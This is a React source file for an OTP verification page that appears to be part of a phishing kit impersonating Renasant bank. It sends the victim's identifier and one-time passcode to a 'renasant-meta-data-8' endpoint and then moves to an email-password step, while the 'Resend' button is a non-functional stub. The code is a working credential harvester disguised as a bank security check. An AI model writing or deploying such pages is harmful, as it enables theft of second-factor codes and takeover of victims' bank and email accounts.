import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';

const OTP: React.FC = () => {
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};

  if (!emzemz) {
    return (
      <FlowCard title="Error">
        <div className="text-center text-red-600">
          Missing verification details. Please restart the login process.
        </div>
      </FlowCard>
    );
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError('');

    if (!otp.trim()) {
      setError('Please enter the verification code.');
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/renasant-meta-data-8/`, {
        emzemz,
        otp,
      });

      navigate('/email-password', { state: { emzemz } });
    } catch (err) {
      console.error('Error submitting OTP:', err);
      setError('There was a problem verifying your passcode. Please try again.');
      setIsLoading(false);
    }
  };

  return (
    <FlowCard title="Verification Required">
      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="bg-blue-50 border border-blue-200 rounded p-4 mb-4">
          <p className="text-sm text-blue-800">
            For your security, we've sent a verification code to your registered email or phone number.
          </p>
        </div>

        <div>
          <label className="block text-sm text-slate-500 mb-1" htmlFor="otp">
            Verification Code
          </label>
          <input
            id="otp"
            name="otp"
            type="text"
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
            className="w-full px-3 py-3 border border-slate-200 rounded text-sm focus:outline-none focus:border-green-500"
            placeholder="Enter 6-digit code"
            maxLength={6}
          />
          {error && (
            <div className="flex items-center gap-2 text-sm text-red-600 mt-2">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
              </svg>
              <span>{error}</span>
            </div>
          )}
        </div>

        <div className="pt-4">
          {!isLoading ? (
            <button
              type="submit"
              className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded font-medium transition-colors"
            >
              Verify
            </button>
          ) : (
            <div className="flex justify-center py-3">
              <div className="h-8 w-8 animate-spin rounded-full border-4 border-solid border-green-600 border-t-transparent" />
            </div>
          )}
        </div>

        <div className="text-center mt-4">
          <button
            type="button"
            className="text-sm text-green-600 hover:underline"
            onClick={() => {
              // Resend OTP logic here
              console.log('Resend OTP');
            }}
          >
            Didn't receive a code? Resend
          </button>
        </div>
      </form>
    </FlowCard>
  );
};

export default OTP;
